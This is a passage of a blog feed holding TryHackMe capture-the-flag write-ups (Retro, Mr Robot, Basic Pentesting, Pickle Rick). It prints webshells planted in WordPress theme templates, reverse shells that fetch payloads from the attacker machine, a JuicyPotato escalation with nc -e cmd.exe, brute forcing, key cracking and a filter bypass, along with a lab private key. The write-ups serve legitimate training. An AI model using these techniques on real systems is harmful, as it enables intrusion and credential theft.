Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.244.218/retro [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2024/09/04 11:11:33 Starting gobuster =============================================================== /wp-content (Status: 301) /wp-includes (Status: 301) /wp-admin (Status: 301) =============================================================== 2024/09/04 11:14:09 Finished =============================================================== RDP Logged in with wage:parzival. The user flag is on the user Wade\u0026rsquo;s desktop.\nEnumeration No other users except for Administrator.\nPS C:\\Users\\Wade\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled After running winPEAS and LaZagne as Wade and running manual enumeration no clear privilege escalation path was found. At that point another attack path was recognized.\nWordpress Login page can be found from /retro/wp-login.php. Credentials wade:parzival gives an admin access to Wordpress.\nInstall Reverse Shell Webshell was installed using Appearance \u0026gt; Theme Editor \u0026gt; Twenty Sixteen. A PHP reverse shell was installed in 404.php template.\nThe shell used can be found from: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php\n# Contents of 404.php \u0026lt;?php /** * The template for displaying 404 pages (not found) * * @package WordPress * @subpackage Twenty_Sixteen * @since Twenty Sixteen 1.0 */ class Shell { private $addr = null; private $port = null; private $os = null; private $shell = null; private $descriptorspec = array( 0 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;r\u0026#39;), // shell can read from STDIN 1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), // shell can write to STDOUT 2 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;) // shell can write to STDERR ); private $buffer = 1024; // read/write buffer size private $clen = 0; // command length private $error = false; // stream read/write error public function __construct($addr, $port) { $this-\u0026gt;addr = $addr; $this-\u0026gt;port = $port; \u0026lt;omitted for brevity\u0026gt; Launching and receiving the shell was done as shown below.\nrlwrap nc -nvlp 4444 curl http://10.10.244.218/retro/wp-content/themes/twentysixteen/404.php OS Enumeration OS level enumeration was done using the reverse shell.\n# User C:\\inetpub\\wwwroot\\retro\\wp-content\\themes\\twentysixteen\u0026gt;whoami iis apppool\\retro # Privileges C:\\inetpub\\wwwroot\\retro\\wp-content\\themes\\twentysixteen\u0026gt;whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Privilege Escalation The user \u0026ldquo;iis apppool\u0026rdquo; has SeImpersonatePrivilage enabled which can be used to escalate privileges.\nJuicyPotato exploit was used and it can be found from https://github.com/ohpe/juicy-potato.\n# Attack machine rlwrap nc -nvlp 4455 python -m http.server 8000 # Target machine mkdir C:/transfer cd C:/transfer wget http://10.10.168.116:8000/JuicyPotato.exe -OutFile jp.exe wget http://10.10.168.116:8000/nc.exe -OutFile nc.exe .\\jp.exe -l 4455 -t * -a \u0026#34;/c C:\\transfer\\nc.exe 10.10.95.172 4455 -e cmd.exe\u0026#34; -p c:\\windows\\system32\\cmd.exe After that the root flag was found from C:/Users/Administrator/Desktop.\nLessons Learned Remember that web server user might have and often has different privs compared to normal user. This realization cost me some hours. I can but hope to remember this point next time. I hadn\u0026rsquo;t used PHP reverse shell with Wordpress before. That worked like charm and reduced some tedious steps I typically do to establish a reverse shell. This will go in the standard toolbox. ","permalink":"https://timo-juhani.github.io/logs/thm-retro/","summary":"\u003ch2 id=\"initial-scans\"\u003eInitial Scans\u003c/h2\u003e\n\u003ch3 id=\"port-scan\"\u003ePort Scan\u003c/h3\u003e\n\u003cp\u003eInitial port scan showed open web and RDP ports. Based on the output below the system was detected to be a Windows host running IIS web server.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -sV 10.10.214.63\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2024-09-02 09:16 BST\nNmap scan report for ip-10-10-214-63.eu-west-1.compute.internal (10.10.214.63)\nHost is up (0.00052s latency).\nNot shown: 998 filtered ports\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\nMAC Address: 02:F2:D4:2C:99:29 (Unknown)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 30.31 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"web-enumeration--scan\"\u003eWeb Enumeration \u0026amp; Scan\u003c/h3\u003e\n\u003ch4 id=\"heading\"\u003e/\u003c/h4\u003e\n\u003cp\u003eVersion: IIS httpd 10.0.\u003c/p\u003e","title":"THM: Retro"},{"content":"Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?\nPort Scan nmap -sV 10.10.198.85 Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-29 11:40 BST Nmap scan report for ip-10-10-198-85.eu-west-1.compute.internal (10.10.198.85) Host is up (0.00068s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd 443/tcp open ssl/http Apache httpd MAC Address: 02:64:59:2F:71:E5 (Unknown) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.35 seconds Web Directory Scan gobuster dir -u http://10.10.198.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /images (Status: 301) /blog (Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /0 (Status: 301) /video (Status: 301) /feed (Status: 301) /image (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio (Status: 301) /intro (Status: 200) /wp-login (Status: 200) /css (Status: 301) /rss2 (Status: 301) /license (Status: 200) /wp-includes (Status: 301) /js (Status: 301) /Image (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /readme (Status: 200) /robots (Status: 200) /dashboard (Status: 302) /%20 (Status: 301) /wp-admin (Status: 301) /phpmyadmin (Status: 403) /0000 (Status: 301) Progress: 14808 / 220561 (6.71%) Reviewed robots.txt file which reveled the first key at /key-1-of-3.txt. Robots file also pointed to a file called /fsocity.dic which seems to be a wordlist of some sort.\nAs the scan with Gobuster continued it became clear the website was build on Wordpress.\nLicense file at /license has a password hidden in plain sight. It\u0026rsquo;s a base64 encoded string in the end of the page. The encoded string translated to \u0026ldquo;elliot:ER28-0652\u0026rdquo;.\nWordpress Enumeration WPScan was run agains the target. The current running version 4.3.1 is vulnerable and thare public exploits available.\nBased on the output the best avenue of attack seemed to be authenticate with elliot\u0026rsquo;s credentials and install a RCE capability on one of the themes that is not in active use. Then enumerate the system further with webshell.\nwpscan --url http://10.10.198.85 --enumerate _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.7 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N] [+] URL: http://10.10.198.85/ [10.10.198.85] [+] Started: Thu Aug 29 12:01:37 2024 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache | - X-Mod-Pagespeed: 1.9.32.3-4523 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.10.198.85/robots.txt | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.198.85/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] The external WP-Cron seems to be enabled: http://10.10.198.85/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15). | Found By: Emoji Settings (Passive Detection) | - http://10.10.198.85/172188c.html, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.3.1\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.198.85/172188c.html, Match: \u0026#39;WordPress 4.3.1\u0026#39; [+] WordPress theme in use: twentyfifteen | Location: http://10.10.198.85/wp-content/themes/twentyfifteen/ | Last Updated: 2021-03-09T00:00:00.000Z | Readme: http://10.10.198.85/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.9 | Style URL: http://10.10.198.85/wp-content/themes/twentyfifteen/style.css?ver=4.3.1 | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen\u0026#39;s simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In 404 Page (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.198.85/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:59 \u0026lt;==============================================\u0026gt; (330 / 330) 100.00% Time: 00:00:59 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:07:33 \u0026lt;============================================\u0026gt; (2575 / 2575) 100.00% Time: 00:07:33 \u0026lt;output omitted\u0026gt; Credentialed Enumeration In as elliot:ER28-0652.\nIn Users section elliot is listed as the administrator. There is another user called mich05654.\nIntall Webshell As elliot edited Twenty Thirteen theme at Appearance \u0026gt; Themes \u0026gt; Editor and added a webshell to the 404.php template.\n# Add the webshell to the beginning of the code system($_GET[cmd]); Webshell Credentialed Enumeration (Continued) The second key was found from user robot\u0026rsquo;s home folder, but it\u0026rsquo;s only readable by user robot. However within the same there seems to be another file called password.raw-md5.\ncurl http://10.10.198.85/wp-content/themes/twentythirteen/404.php?cmd=ls+-al+/home/robot total 16 drwxr-xr-x 2 root root 4096 Nov 13 2015 . drwxr-xr-x 3 root root 4096 Nov 13 2015 .. -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5 curl http://10.10.198.85/wp-content/themes/twentythirteen/404.php?cmd=cat+/home/robot/password.raw-md5 robot:c3fcd3d76192e4007dfb496cca67e13b Hash Cracking # Cracking robot\u0026#39;s hash john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash abcdefghijklmnopqrstuvwxyz (robot) Upgrade to RSHELL Upgraded to a reverse shell to make the enumeration easier and faster.\n# Attack machine ## Create and move the payload to target (HTTP download) msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.73.30 LPORT=4444 -f elf -o reverse.elf ## Open listener rlwrap nc -nvlp 4444 # Target machine curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=wget+http://10.10.73.30:8000/reverse.elf curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=chmod+777+reverse.elf curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=./reverse.elf python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; RSHELL redentialed Enumeration (Continued) Changed user to robot and got the second key from robot\u0026rsquo;s home folder.\nsu - robot cat /home/robot/key-2-of-3.txt Privilege Escalation Nmap had SUID bit set. This is the chosen avenue for privesc.\nfind / -perm -4000 2\u0026gt;/dev/null /usr/local/bin/nmap GTFOBins confirmed that there is an exploit for this. However, NMAP seems to have an interactive shell which runs in root context. Interactive shell was chosen due to its direct path to the end goal.\n# Read the last key ./usr/local/bin/nmap --interactive !cat /root/key-3-of-3.txt Lessons Learned The website was cool! :D /license file fooled me at first. I should\u0026rsquo;ve used inspector and not just verify source code. It\u0026rsquo;s not that you can\u0026rsquo;t read the password from the source code but I just missed the fact that I had to roll down the source code since the password was in the end of it. A silly mistake to be honest. I didn\u0026rsquo;t know Nmap had an interactive shell. I\u0026rsquo;m sure this will come useful. Hacking Wordpress is an easy process if it\u0026rsquo;s A) vulnerable - most often it\u0026rsquo;s the templates that are vulnerable or B) you have some creds. ","permalink":"https://timo-juhani.github.io/logs/thm-mr-robot/","summary":"\u003cp\u003eCan you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?\u003c/p\u003e\n\u003ch2 id=\"port-scan\"\u003ePort Scan\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -sV 10.10.198.85\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2024-08-29 11:40 BST\nNmap scan report for ip-10-10-198-85.eu-west-1.compute.internal (10.10.198.85)\nHost is up (0.00068s latency).\nNot shown: 997 filtered ports\nPORT    STATE  SERVICE  VERSION\n22/tcp  closed ssh\n80/tcp  open   http     Apache httpd\n443/tcp open   ssl/http Apache httpd\nMAC Address: 02:64:59:2F:71:E5 (Unknown)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 31.35 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"directory-scan\"\u003eDirectory Scan\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003egobuster dir -u http://10.10.198.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\n/images (Status: 301)\n/blog (Status: 301)\n/sitemap (Status: 200)\n/rss (Status: 301)\n/login (Status: 302)\n/0 (Status: 301)\n/video (Status: 301)\n/feed (Status: 301)\n/image (Status: 301)\n/atom (Status: 301)\n/wp-content (Status: 301)\n/admin (Status: 301)\n/audio (Status: 301)\n/intro (Status: 200)\n/wp-login (Status: 200)\n/css (Status: 301)\n/rss2 (Status: 301)\n/license (Status: 200)\n/wp-includes (Status: 301)\n/js (Status: 301)\n/Image (Status: 301)\n/rdf (Status: 301)\n/page1 (Status: 301)\n/readme (Status: 200)\n/robots (Status: 200)\n/dashboard (Status: 302)\n/%20 (Status: 301)\n/wp-admin (Status: 301)\n/phpmyadmin (Status: 403)\n/0000 (Status: 301)\nProgress: 14808 / 220561 (6.71%)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eReviewed robots.txt file which reveled the first key at /key-1-of-3.txt. Robots file also pointed to a file called /fsocity.dic which seems to be a wordlist of some sort.\u003c/p\u003e","title":"THM: Mr Robot"},{"content":"Port Scan nmap 10.10.29.172 # Results Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 07:20 BST Nmap scan report for ip-10-10-29-172.eu-west-1.compute.internal (10.10.29.172) Host is up (0.00089s latency). Not shown: 994 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8009/tcp open ajp13 8080/tcp open http-proxy MAC Address: 02:9B:BD:BC:6C:57 (Unknown) Web Enumeration The homepage displays: \u0026ldquo;Undergoing maintenance\u0026rdquo;. In the source code there is a comment:\n\u0026lt;!-- Check our dev note section if you need to know what to work on. --\u0026gt;\nSite Structure gobuster dir -u http://10.10.29.172 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html # Results /index.html (Status: 200) /development (Status: 301) /server-status (Status: 403) As guided by the comment in the source code /development was investigated.\n/development lists two files: dev.txt and j.txt\n# Contents of dev.txt 2018-04-23: I\u0026#39;ve been messing with that struts stuff, and it\u0026#39;s pretty cool! I think it might be neat to host that on this server too. Haven\u0026#39;t made any real web apps yet, but I have tried that example you get to show off how it works (and it\u0026#39;s the REST version of the example!). Oh, and right now I\u0026#39;m using version 2.5.12, because other versions were giving me trouble. -K 2018-04-22: SMB has been configured. -K 2018-04-21: I got Apache set up. Will put in our content later. -J # Contents of j.txt For J: I\u0026#39;ve been auditing the contents of /etc/shadow to make sure we don\u0026#39;t have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP. -K Conclusions from dev.txt:\nApache Struts 2.5.12 likely in use. It\u0026rsquo;s likely that this exploit works https://www.exploit-db.com/exploits/42627. However, the REST URI is unknown at this point. SMB has been enabled (as seen in port scan). Conclusions from j.txt:\nConfirmed to be a Linux system. There is one hash that can be cracked. SMB Enumeration Anonymous login was accepted.\n# Listing SMB shares smbclient -L 10.10.29.172 WARNING: The \u0026#34;syslog\u0026#34; option is deprecated Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- Anonymous Disk IPC$ IPC IPC Service (Samba Server 4.3.11-Ubuntu) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP BASIC2 # Logging in smbclient //10.10.29.172/Anonymous WARNING: The \u0026#34;syslog\u0026#34; option is deprecated Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Thu Apr 19 18:31:20 2018 .. D 0 Thu Apr 19 18:13:06 2018 staff.txt N 173 Thu Apr 19 18:29:55 2018 14318640 blocks of size 1024. 11007620 blocks available # Downloading file smb: \\\u0026gt; get staff.txt getting file \\staff.txt of size 173 as staff.txt (84.5 KiloBytes/sec) (average 84.5 KiloBytes/sec) The file staff.txt contains to names: Jan and Kay.\nBrute Force Attempt # Unsuccesful attempts hydra -l jan -P /usr/share/wordlists/rockyou.txt smb://10.10.29.172 # Successful attempt hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.195.154 -t 4 # Results \u0026lt;ouput omitted\u0026gt; [22][ssh] host: 10.10.195.154 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2024-08-28 11:08:24 Brute forcing is the last resort. It can be a massive waste of time. This time though we found a valid credential by brute forcing SSH.\nConnected Enumeration SSH as jan SSH into the target machine using \u0026ldquo;jan:armando\u0026rdquo;.\nFrom /etc/passwd we could confirm user \u0026ldquo;kay\u0026rdquo; exists.\nAlso /etc/shadow shows interesting rights.\nls -l /etc/shadow -rw-r----- 1 root shadow 1085 Apr 23 2018 /etc/shadow kay\u0026rsquo;s Home Folder A file called pass.bak is stored there. Only kay can read it.\nSSH credentials stored in .ssh can be read as jan.\n# kay\u0026#39;s private key -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75 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 -----END RSA PRIVATE KEY----- SSH as kay kay\u0026rsquo;s private key was tried, but it was protected by passphrase.\nCrack kay\u0026rsquo;s SSH Key Passphrase python /opt/john/ssh2john.py kayid \u0026gt; kayidhash john --wordlist=/usr/share/wordlists/rockyou.txt kayidhash # Result beeswax (kayid) Re-try as kay Using Stolen Key And Cracked Passphrase This time SSH connection was succesful.\ncat pass.bak # Result heresareallystrongpasswordthatfollowsthepasswordpolicy$$ Lessons Learned Brute forcing is a huge gamble always. Use sparingly to avoid time waste. This was easy but still very fun for honing the work process. I don\u0026rsquo;t know whether it applies to this discipline but they say that 90% of the practise should feel easy. If doesn\u0026rsquo;t you are risking a burn out. ","permalink":"https://timo-juhani.github.io/logs/basic-pentesting/","summary":"\u003ch2 id=\"port-scan\"\u003ePort Scan\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap 10.10.29.172\n\n# Results\nStarting Nmap 7.60 ( https://nmap.org ) at 2024-08-28 07:20 BST\nNmap scan report for ip-10-10-29-172.eu-west-1.compute.internal (10.10.29.172)\nHost is up (0.00089s latency).\nNot shown: 994 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n8009/tcp open  ajp13\n8080/tcp open  http-proxy\nMAC Address: 02:9B:BD:BC:6C:57 (Unknown)\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"web-enumeration\"\u003eWeb Enumeration\u003c/h2\u003e\n\u003cp\u003eThe homepage displays: \u0026ldquo;Undergoing maintenance\u0026rdquo;. In the source code there is a comment:\u003c/p\u003e","title":"THM: Basic Pentesting"},{"content":"Task This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle\nEnumeration Port Scan nmap -sV -sC 10.10.93.106 Starting Nmap 7.60 ( https://nmap.org ) at 2024-08-16 10:26 BST Nmap scan report for ip-10-10-93-106.eu-west-1.compute.internal (10.10.93.106) Host is up (0.00026s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Rick is sup4r cool MAC Address: 02:8E:DC:DD:72:CF (Unknown) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds SSH Server Only accepts certificate based authentication.\nWeb Server Apache 2.4.41 on Ubuntu.\nSource Code There is a comment field with a username in it.\n\u0026lt;!-- Note to self, remember username! Username: R1ckRul3s --\u0026gt; Structure Scan the webpage with Gobuster to find directory structure.\ngobuster dir -u http://10.10.93.106/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Found the following paths.\n/assets (Status: 301) /server-status (Status: 403)s Scanning again with a different wordlist reveals robots.txt file.\ngobuster dir -u http://10.10.93.106 -w /usr/share/wordlists/dirb/big.txt Robots.txt contains one entry \u0026ldquo;Wubbalubbadubdub\u0026rdquo;.\nBrute forcing the site for files of interest.\ngobuster dir -u http://10.10.93.106/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html Gobuster scan finds a list of pages:\n/login.php (Status: 200) /index.html (Status: 200) /assets (Status: 301) /portal.php (Status: 302) /denied.php (Status: 302) /server-status (Status: 403) Login Page Login page can be found from /login.php.\nLogin with R1ckRul3s:Wubbalubbadubdub succeeds.\nCredentialed Enumeration Running \u0026ldquo;ls\u0026rdquo; reveals Sup3rS3cretPickl3Ingred.txt, but \u0026ldquo;cat\u0026rdquo; has been disabled.\nCommand Injection Bypassing the command filter using quotations marks.\nc\u0026#34;a\u0026#34;t 